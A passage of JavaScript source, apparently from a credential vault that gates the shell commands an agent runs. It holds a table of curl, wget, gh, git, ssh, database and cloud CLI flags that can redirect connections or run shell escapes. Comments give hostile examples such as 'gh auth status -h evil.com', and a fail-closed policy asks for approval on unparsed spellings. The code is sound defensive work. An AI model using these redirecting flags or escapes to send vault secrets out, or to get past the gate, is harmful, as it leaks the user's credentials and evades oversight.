  { name: 'curl', proxyEnv: true, bareHosts: 'all', globs: true, urlFlags: ['--url'], blindPrefixes: ['--expand-'], valueFlags: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc', '--interface'], configFlags: ['-K', '--config'], fileFlags: ['--cacert', '--capath', '-E', '--cert', '--key', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'] },   // round 3: a flag that redirects the connection off the URL's host (--alt-svc / --interface) is keyed; a value that is an agent-writable FILE (cert / ca / netrc / hsts cache) is a config class — blind unless it is the vault's own $VAULT_FILE
  { name: 'wget', proxyEnv: true, bareHosts: 'all', prefixOpts: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute', '-B', '--base', '--bind-address', '--use-askpass'], configFlags: ['--config', '-i', '--input-file', '--input-metalink'], fileFlags: ['--ca-certificate', '--certificate', '--private-key', '--load-cookies', '--save-cookies'] },   // round 3 (m2): --input-metalink fetches every URL in its file (like -i); a cert / cookie file the agent writes is a config class
  { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, bareHosts: 'first', valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'], hostFlags: ['--hostname'], repoFlags: ['-R', '--repo'], repoEnv: ['GH_REPO'], blindSubs: [['repo', 'clone'], ['repo', 'fork'], ['repo', 'sync'], ['pr', 'checkout'], ['extension', 'install'], ['extension', 'upgrade']], blindFlagSubs: [{ sub: ['pr', 'merge'], longs: ['--delete-branch'], shorts: ['-d'] }, { sub: ['repo', 'create'], longs: ['--push', '--clone'], shorts: ['-c'] }], grammarVersion: '2.102.0', grammar: {
      "agent-task create": {"value":["--base","--custom-agent","--from-file","--repo","-F","-R","-a","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "agent-task view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "api": {"value":["--cache","--field","--header","--hostname","--input","--jq","--method","--preview","--raw-field","--template","-F","-H","-X","-f","-p","-q","-t"],"repoValues":[],"spec":0,"host":null},
      "attestation download": {"value":["--digest-alg","--hostname","--limit","--owner","--predicate-type","--repo","-L","-R","-d","-o"],"repoValues":[],"spec":0,"host":null},
      "attestation trusted-root": {"value":["--hostname","--tuf-root","--tuf-url"],"repoValues":[],"spec":0,"host":null},
      "attestation verify": {"value":["--bundle","--cert-identity","--cert-identity-regex","--cert-oidc-issuer","--custom-trusted-root","--digest-alg","--format","--hostname","--jq","--limit","--owner","--predicate-type","--repo","--signer-digest","--signer-repo","--signer-workflow","--source-digest","--source-ref","--template","-L","-R","-b","-d","-i","-o","-q","-t"],"repoValues":[],"spec":0,"host":null},
      "auth login": {"value":["--git-protocol","--hostname","--scopes","-h","-p","-s"],"repoValues":[],"spec":0,"host":"-h"},
      "auth logout": {"value":["--hostname","--user","-h","-u"],"repoValues":[],"spec":0,"host":"-h"},
      "auth refresh": {"value":["--hostname","--remove-scopes","--scopes","-h","-r","-s"],"repoValues":[],"spec":0,"host":"-h"},
      "auth setup-git": {"value":["--hostname","-h"],"repoValues":[],"spec":0,"host":"-h"},
      "auth status": {"value":["--hostname","--jq","--json","--template","-h"],"repoValues":[],"spec":0,"host":"-h"},
      "auth switch": {"value":["--hostname","--user","-h","-u"],"repoValues":[],"spec":0,"host":"-h"},
      "auth token": {"value":["--hostname","--user","-h","-u"],"repoValues":[],"spec":0,"host":"-h"},
      "browse": {"value":["--branch","--commit","--repo","-R","-b","-c"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "cache delete": {"value":["--ref","--repo","-R","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "cache list": {"value":["--jq","--json","--key","--limit","--order","--ref","--repo","--sort","--template","-L","-O","-R","-S","-k","-q","-r","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "discussion comment": {"value":["--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "discussion create": {"value":["--body","--body-file","--category","--label","--repo","--title","-F","-R","-b","-c","-l","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "discussion edit": {"value":["--add-label","--body","--body-file","--category","--remove-label","--repo","--title","-F","-R","-b","-c","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "discussion list": {"value":["--after","--author","--category","--jq","--json","--label","--limit","--order","--repo","--search","--sort","--state","--template","-A","-L","-R","-S","-c","-l","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "discussion view": {"value":["--after","--jq","--json","--limit","--order","--repo","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "extension install": {"value":["--pin"],"repoValues":[],"spec":1,"host":null},
      "issue close": {"value":["--comment","--duplicate-of","--reason","--repo","-R","-c","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue comment": {"value":["--attach","--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue create": {"value":["--assignee","--attach","--blocked-by","--blocking","--body","--body-file","--label","--milestone","--parent","--project","--recover","--repo","--template","--title","--type","-F","-R","-T","-a","-b","-l","-m","-p","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue delete": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue develop": {"value":["--base","--branch-repo","--name","--repo","--worktree","-R","-b","-n"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue edit": {"value":["--add-assignee","--add-blocked-by","--add-blocking","--add-label","--add-project","--add-sub-issue","--attach","--body","--body-file","--milestone","--parent","--remove-assignee","--remove-blocked-by","--remove-blocking","--remove-label","--remove-project","--remove-sub-issue","--repo","--title","--type","-F","-R","-b","-m","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue list": {"value":["--app","--assignee","--author","--jq","--json","--label","--limit","--mention","--milestone","--repo","--search","--state","--template","--type","-A","-L","-R","-S","-a","-l","-m","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue lock": {"value":["--reason","--repo","-R","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue pin": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue reopen": {"value":["--comment","--repo","-R","-c"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue status": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue transfer": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue unlock": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue unpin": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "issue view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "label clone": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":1,"host":null},
      "label create": {"value":["--color","--description","--repo","-R","-c","-d"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "label delete": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "label edit": {"value":["--color","--description","--name","--repo","-R","-c","-d","-n"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "label list": {"value":["--jq","--json","--limit","--order","--repo","--search","--sort","--template","-L","-R","-S","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr checkout": {"value":["--branch","--repo","--worktree","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr checks": {"value":["--interval","--jq","--json","--repo","--template","-R","-i","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr close": {"value":["--comment","--repo","-R","-c"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr comment": {"value":["--attach","--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr create": {"value":["--assignee","--attach","--base","--body","--body-file","--head","--label","--milestone","--project","--recover","--repo","--reviewer","--template","--title","-B","-F","-H","-R","-T","-a","-b","-l","-m","-p","-r","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr diff": {"value":["--color","--exclude","--repo","-R","-e"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr edit": {"value":["--add-assignee","--add-label","--add-project","--add-reviewer","--attach","--base","--body","--body-file","--milestone","--remove-assignee","--remove-label","--remove-project","--remove-reviewer","--repo","--title","-B","-F","-R","-b","-m","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr list": {"value":["--app","--assignee","--author","--base","--head","--jq","--json","--label","--limit","--repo","--search","--state","--template","-A","-B","-H","-L","-R","-S","-a","-l","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr lock": {"value":["--reason","--repo","-R","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr merge": {"value":["--author-email","--body","--body-file","--match-head-commit","--repo","--subject","-A","-F","-R","-b","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr ready": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr reopen": {"value":["--comment","--repo","-R","-c"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr revert": {"value":["--body","--body-file","--repo","--title","-F","-R","-b","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr review": {"value":["--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr status": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr unlock": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr update-branch": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "pr view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release create": {"value":["--discussion-category","--notes","--notes-file","--notes-start-tag","--repo","--target","--title","-F","-R","-n","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release delete": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release delete-asset": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release download": {"value":["--archive","--dir","--output","--pattern","--repo","-A","-D","-O","-R","-p"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release edit": {"value":["--discussion-category","--notes","--notes-file","--repo","--tag","--target","--title","-F","-R","-n","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release list": {"value":["--jq","--json","--limit","--order","--repo","--template","-L","-O","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release upload": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release verify": {"value":["--format","--jq","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release verify-asset": {"value":["--format","--jq","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "release view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo archive": {"value":[],"repoValues":[],"spec":1,"host":null},
      "repo autolink create": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo autolink delete": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo autolink list": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo autolink view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo clone": {"value":["--upstream-remote-name","-u"],"repoValues":[],"spec":1,"host":null},
      "repo create": {"value":["--description","--gitignore","--homepage","--license","--remote","--source","--team","--template","-d","-g","-h","-l","-p","-r","-s","-t"],"repoValues":["--template","-p"],"spec":1,"host":null},
      "repo delete": {"value":[],"repoValues":[],"spec":1,"host":null},
      "repo deploy-key add": {"value":["--repo","--title","-R","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo deploy-key delete": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo deploy-key list": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo edit": {"value":["--add-topic","--default-branch","--description","--homepage","--remove-topic","--squash-merge-commit-message","--visibility","-d","-h"],"repoValues":[],"spec":1,"host":null},
      "repo fork": {"value":["--fork-name","--org","--remote-name"],"repoValues":[],"spec":1,"host":null},
      "repo read-dir": {"value":["--jq","--json","--ref","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo read-file": {"value":["--jq","--json","--output","--ref","--repo","--template","-R","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo rename": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "repo set-default": {"value":[],"repoValues":[],"spec":1,"host":null},
      "repo sync": {"value":["--branch","--source","-b","-s"],"repoValues":[],"spec":1,"host":null},
      "repo unarchive": {"value":[],"repoValues":[],"spec":1,"host":null},
      "repo view": {"value":["--branch","--jq","--json","--template","-b","-q","-t"],"repoValues":[],"spec":1,"host":null},
      "ruleset check": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "ruleset list": {"value":["--limit","--org","--repo","-L","-R","-o"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "ruleset view": {"value":["--org","--repo","-R","-o"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run cancel": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run delete": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run download": {"value":["--dir","--name","--pattern","--repo","-D","-R","-n","-p"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run list": {"value":["--branch","--commit","--created","--event","--jq","--json","--limit","--repo","--status","--template","--user","--workflow","-L","-R","-b","-c","-e","-q","-s","-t","-u","-w"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run rerun": {"value":["--job","--repo","-R","-j"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run view": {"value":["--attempt","--job","--jq","--json","--repo","--template","-R","-a","-j","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "run watch": {"value":["--interval","--repo","-R","-i"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "search code": {"value":["--extension","--filename","--jq","--json","--language","--limit","--match","--owner","--repo","--size","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "search commits": {"value":["--author","--author-date","--author-email","--author-name","--committer","--committer-date","--committer-email","--committer-name","--hash","--jq","--json","--limit","--order","--owner","--parent","--repo","--sort","--template","--tree","--visibility","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "search issues": {"value":["--app","--assignee","--author","--closed","--commenter","--comments","--created","--interactions","--involves","--jq","--json","--label","--language","--limit","--match","--mentions","--milestone","--order","--owner","--project","--reactions","--repo","--search-type","--sort","--state","--team-mentions","--template","--updated","--visibility","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "search prs": {"value":["--app","--assignee","--author","--base","--checks","--closed","--commenter","--comments","--created","--head","--interactions","--involves","--jq","--json","--label","--language","--limit","--match","--mentions","--merged-at","--milestone","--order","--owner","--project","--reactions","--repo","--review","--review-requested","--reviewed-by","--sort","--state","--team-mentions","--template","--updated","--visibility","-B","-H","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "secret delete": {"value":["--app","--env","--org","--repo","-R","-a","-e","-o"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "secret list": {"value":["--app","--env","--jq","--json","--org","--repo","--template","-R","-a","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "secret set": {"value":["--app","--body","--env","--env-file","--org","--repo","--repos","--visibility","-R","-a","-b","-e","-f","-o","-r","-v"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "skill install": {"value":["--agent","--dir","--pin","--scope"],"repoValues":[],"spec":1,"host":null},
      "skill preview": {"value":[],"repoValues":[],"spec":1,"host":null},
      "variable delete": {"value":["--env","--org","--repo","-R","-e","-o"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "variable get": {"value":["--env","--jq","--json","--org","--repo","--template","-R","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "variable list": {"value":["--env","--jq","--json","--org","--repo","--template","-R","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "variable set": {"value":["--body","--env","--env-file","--org","--repo","--repos","--visibility","-R","-b","-e","-f","-o","-r","-v"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow disable": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow enable": {"value":["--repo","-R"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow list": {"value":["--jq","--json","--limit","--repo","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow run": {"value":["--field","--raw-field","--ref","--repo","-F","-R","-f","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null},
      "workflow view": {"value":["--ref","--repo","-R","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null},
    }, passDashes: true },   // round 3: gh extension install/upgrade runs code; a verb+flag that drives git (pr merge --delete-branch, repo create --push/--clone) is blind; round 5: the gh flag knowledge is GENERATED from gh's own --help per verb (scripts/gen-gh-grammar.mjs → `grammar`; test-vault-run-model ⑤c re-runs the same parse against the live gh and diffs — a verb / value flag / bool / positional shape / hostname short drift is RED by name). shapeOf reads it: a value flag consumes its argument in ANY spelling so it is not misread as the <...repository> positional (repo edit -d x evil.com/o/r), a `spec` verb reads positionals[0] as HOST/OWNER/REPO (the table caught skill install/preview + label clone, not only repo's verbs; gh api <path> stays a path), a `host` short is --hostname (gh auth status -h evil.com), and a cluster's =value binds to the LAST letter only so an earlier git-driving bool is still set true (gh pr merge -dm=false). ROUND 6 (FAIL CLOSED — do not model cobra): the reader reads ONLY the spellings it can read with certainty and BLINDS the rest of gh. A dash BEFORE the verb words, or a verb the table does not carry, ⇒ vg null ⇒ blind (it asks — asking is cheap, a silent send is the one thing the vault must never do). So the table now carries EVERY host-reaching verb (gen-gh-grammar.mjs walks the WHOLE live tree): a `<repository>`/`<name>` positional (spec), --hostname (host), or a value the help TYPEs as a repository (repoValues — repo create --template, the inherited -R) — the agent's own gh (issue list, pr merge, repo view, api) stays ok:own while an unknown or relocated spelling asks. grammar + grammarVersion are GENERATED (node scripts/gen-gh-grammar.mjs --write, pinned to the runner's gh); ⑤c re-parses the whole live tree IN PARALLEL and diffs the version AND the table — any drift RED by name. gh api <path> is a path under the default host, never a host   // round 2b: these drive `git` (the project's .git/config + hooks, like the git row); args after `--` go to git
  { name: 'git', sub: 1, scpLike: true, proxyEnv: true, confDest: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
  { name: 'aws', hosts: ['*.amazonaws.com'], sub: 2, proxyEnv: true, valueFlags: ['--profile', '--region', '--output'] },
  { name: 'gcloud', hosts: ['*.googleapis.com'], sub: 3, proxyEnv: true, valueFlags: ['--project', '--account', '--format', '--configuration'] },
  { name: 'az', hosts: ['management.azure.com', 'login.microsoftonline.com'], sub: 2, proxyEnv: true, valueFlags: ['--subscription', '-g', '--resource-group', '-o', '--output'] },
  { name: 'npm', hosts: ['registry.npmjs.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'pip', hosts: ['pypi.org', 'files.pythonhosted.org'], sub: 1, proxyEnv: true, runsProject: true },
  { name: 'docker', hosts: ['registry-1.docker.io'], sub: 1, registry: true, proxyEnv: false, runsProject: true },
  { name: 'kubectl', sub: 1, proxyEnv: true, hostFlags: ['-s', '--server'], valueFlags: ['-n', '--namespace', '--context', '--cluster', '--user', '-o', '--output', '-l', '--selector', '-f', '--filename', '-c', '--container', '--kubeconfig', '-s', '--server'], configFlags: ['--kubeconfig'] },
  { name: 'psql', hostFlags: ['-h', '--host'], hostEnv: ['PGHOST', 'PGHOSTADDR'], conninfo: true, proxyEnv: false, prefixOpts: true, valueFlags: ['-c', '--command', '-f', '--file', '-d', '--dbname', '-o', '--output'], configFlags: ['-f', '--file'], scriptFlags: ['-c', '--command', '-o', '--output'], escapes: /^[\\|]/ },   // round 2: `-c '\! …'` is psql's shell (a -c starting with a backslash is a meta-command); `-o '|cmd'` pipes to a shell; a -f file may hold one
  { name: 'mysql', hostFlags: ['-h', '--host'], hostEnv: ['MYSQL_HOST'], proxyEnv: false, prefixOpts: true, valueFlags: ['-e', '--execute'], configFlags: ['--defaults-file', '--defaults-extra-file', '--login-path'], scriptFlags: ['-e', '--execute'], escapes: /\\[!.]|\b(?:system|source)\b/i },   // round 2: the client's `system` / `\!` / `source`
  { name: 'rclone', sub: 1, proxyEnv: true, confDest: true, valueFlags: ['--config'], configFlags: ['--config'] },
  { name: 'ssh', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'sftp', sshTarget: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F', '-b'] },   // round 2: -b = a batch file (its `!command` is a local shell)
  { name: 'scp', scpLike: true, copies: true, proxyEnv: false, valueFlags: SSH_VALUE_FLAGS, keyed: SSH_KEYED, configFlags: ['-F'] },
  { name: 'rsync', scpLike: true, copies: true, proxyEnv: false, valueFlags: ['-e', '--rsh'], keyed: ['-e', '--rsh'] },
].map((r) => Object.freeze({ argvOnly: false, ...r })));

/** argv[0] (and the door's resolution of it) → its lookup name: the basename, lower case, no `.exe`. */
const toolNameOf = (argv0, resolved = null) => String(resolved || argv0 || '').split(/[\\/]/).pop().toLowerCase().replace(/\.exe$/, '');
const findIn = (list, n, key = (r) => r.names) => list.find((r) => key(r).includes(n)) || list.find((r) => key(r).includes(n.replace(/[\d.]+$/, ''))) || null;
const knownToolOf = (name) => (name ? findIn(KNOWN_TOOLS, name, (r) => [r.name, ...(r.aka || [])]) : null);
/** → { code, cls, name, words } | null. */
function refusedTool(argv0, { resolved = null } = {}) {
  const name = toolNameOf(argv0, resolved);
  if (!name) return refuse('no_command');
  const row = findIn(REFUSING, name) || REFUSING.find((r) => r.prefix && name.startsWith(r.prefix)) || null;
  return row ? refuse(row.code, { cls: row.cls, tool: name }) : null;
}
/** 'shell' | 'interpreter' | 'tool' — a shell's or an interpreter's whole command line is its program. */
function toolKindOf(name) { const n = String(name || ''); return SHELLS.includes(n) || SHELLS.includes(n.replace(/[\d.]+$/, '')) ? 'shell' : INTERPRETERS.includes(n) || INTERPRETERS.includes(n.replace(/[\d.]+$/, '')) ? 'interpreter' : 'tool'; }

// ── THE PLAN (the request → what the child gets; every refusal by name) ──
const bytesOf = (s) => { let n = 0; for (const ch of String(s)) { const c = ch.codePointAt(0); n += c < 0x80 ? 1 : c < 0x800 ? 2 : c < 0x10000 ? 3 : 4; } return n; };
const pairsOf = (x) => (Array.isArray(x) ? x.map((p) => (Array.isArray(p) ? [String(p[0]), String(p[1] == null ? '' : p[1])] : [String(p && p.name), String(p && p.value != null ? p.value : '')])) : x && typeof x === 'object' ? Object.entries(x).map(([k, v]) => [k, String(v == null ? '' : v)]) : []);
/** The CLI's words → the request. `vibespace-vault run [--env NAME=V]… [--file NAME=vault://…|@template]… [--stdin vault://…]
 *  [--allow-argv] [--on <machine>] [--timeout <s>] [--] <command…>` → { ok, req } | refusal. */
const RUN_FLAGS = Object.freeze(['--env', '--file', '--stdin', '--allow-argv', '--on', '--timeout']);
function timeoutOf(v) { const n = Number(v); return /^\d{1,4}$/.test(String(v)) && n >= 1 && n <= TIMEOUT_MAX_S ? n : null; }
function parseRunArgs(args) {
  const a = (Array.isArray(args) ? args : []).map(String);
  const req = { argv: [], env: [], file: [], stdin: null, allowArgv: false, on: null, timeoutSec: TIMEOUT_DEFAULT_S };
  let i = 0;
  for (; i < a.length; i++) {
    const x = a[i];
    if (x === '--') { i++; break; }
    if (!x.startsWith('--')) break;
    const eq = x.indexOf('='), flag = eq > 0 ? x.slice(0, eq) : x;
    if (!RUN_FLAGS.includes(flag)) return refuse('bad_flag', { flag });
    if (flag === '--allow-argv') { if (eq > 0) return refuse('bad_flag', { flag }); req.allowArgv = true; continue; }
    const v = eq > 0 ? x.slice(eq + 1) : i + 1 < a.length ? a[++i] : null;
    if (v == null) return refuse('bad_flag', { flag });
    if (flag === '--env' || flag === '--file') { const k = v.indexOf('='); if (k < 1) return refuse('bad_flag', { flag }); req[flag.slice(2)].push([v.slice(0, k), v.slice(k + 1)]); }
    else if (flag === '--stdin') { if (req.stdin != null) return refuse('bad_flag', { flag }); req.stdin = v; }
    else if (flag === '--on') req.on = v;
    else { const t = timeoutOf(v); if (t == null) return refuse('bad_flag', { flag }); req.timeoutSec = t; }
  }
  req.argv = a.slice(i);
  return { ok: true, req };
}
/**
 * The request → THE PLAN, or a refusal. `req` = { argv, env, file, stdin, allowArgv, on, resolved, templates } — `env` / `file`
 * as [[NAME, value]] (or { NAME: value }); `resolved` = argv[0] on the agent env's PATH (the door's lookup); `templates` =
 * { <path>: text } for every `--file NAME=@<path>` (the door reads them inside the cwd fence); `timeoutSec` 1–600 (120).
 * → { ok: true, argv, tool, name, kind, row, refs: [ref…], env: [{ name, ref }], plainEnv: [{ name, value }],
 *     files: [{ slot, name|null, ref|null, template|null, text|null }], stdin: ref|null, injection: [..], argvExposed, on, timeoutSec }
 */
function planOf(req = {}) {
  const argv = Array.isArray(req.argv) ? req.argv.map(String) : [];
  if (!argv.length || !argv[0]) return refuse('no_command');
  if (bytesOf(argv.join(' ')) > CMD_MAX) return refuse('cmd_too_long');
  const tr = refusedTool(argv[0]) || (req.resolved ? refusedTool(argv[0], { resolved: req.resolved }) : null);   // lane vault-run-door: the typed name AND the resolved path's
  if (tr) return tr;
  const name = toolNameOf(argv[0], req.resolved), row = knownToolOf(name);
  const refs = new Map(), names = new Set(), env = [], plainEnv = [], files = [], injection = [];
  const add = (r) => { if (!refs.has(r.id)) refs.set(r.id, refOf(r.store, r.entry, r.field)); return refs.get(r.id).ref; };
  const claim = (n, as) => {
    if (!ENV_NAME.test(n)) return refuse('bad_env_name', { name: n });
    if (names.has(n)) return refuse('duplicate_name', { name: n });
    const why = envRefusedOf(n, as);
    if (why) return refuse('env_refused', { name: n, why });
    names.add(n); return null;
  };
  for (const [n, v] of pairsOf(req.env)) {
    const sc = scanRefs(v);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    const r = sc.refs.length ? parseRef(v) : null;
    if (sc.refs.length && !r) return refuse('bad_reference', { text: v.slice(0, 80), why: 'an env value is one whole reference (a template file holds the rest)' });
    const no = claim(n, r ? 'env' : 'plain');
    if (no) return no;
    if (r) { env.push({ name: n, ref: add(r) }); injection.push(`env:${n}`); } else plainEnv.push({ name: n, value: v });
  }
  for (const [n, v] of pairsOf(req.file)) {
    const no = claim(n, 'file');
    if (no) return no;
    if (v.startsWith('@')) {
      const p = v.slice(1), t = req.templates && Object.prototype.hasOwnProperty.call(req.templates, p) ? req.templates[p] : null;
      if (!p) return refuse('bad_flag', { flag: '--file' });
      if (typeof t !== 'string') return refuse('template_unread', { template: p });
      if (bytesOf(t) > TEMPLATE_MAX) return refuse('template_too_long', { template: p });
      const sc = scanRefs(t);
      if (sc.bad.length || sc.refs.some((x) => x.form !== 'brace')) return refuse('bad_reference', { text: (sc.bad[0] || sc.refs.find((x) => x.form !== 'brace')).text || '', why: 'a template names a value as $VAULT{<store>/<row>/<field>}' });
      for (const x of sc.refs) add(x);
      files.push({ slot: files.length, name: n, ref: null, template: p, text: t });
    } else {
      const r = parseRef(v);
      if (!r) return refuse('bad_reference', { text: v.slice(0, 80) });
      files.push({ slot: files.length, name: n, ref: add(r), template: null, text: null });
    }
    injection.push(`file:${n}`);
  }
  let stdin = null;
  if (req.stdin != null) { const r = parseRef(String(req.stdin)); if (!r) return refuse('bad_reference', { text: String(req.stdin).slice(0, 80) }); stdin = add(r); injection.push('stdin'); }
  let argvExposed = false;
  for (const a of argv) {
    const sc = scanRefs(a);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    for (const x of sc.refs) {
      if (x.form === 'file' && x.name) { if (!files.some((f) => f.name === x.name)) return refuse('bad_reference', { text: `$VAULT_FILE{${x.name}}`, why: `no --file ${x.name}=… declares it` }); continue; }
      if (x.form === 'file') { const ref = add(x); if (!files.some((f) => f.name === null && f.ref === ref)) { files.push({ slot: files.length, name: null, ref, template: null, text: null }); injection.push('file:$VAULT_FILE'); } continue; }
      const iv = injectionOf('argv', { allowArgv: !!req.allowArgv, row });
      if (!iv.ok) return { ...iv, tool: name };
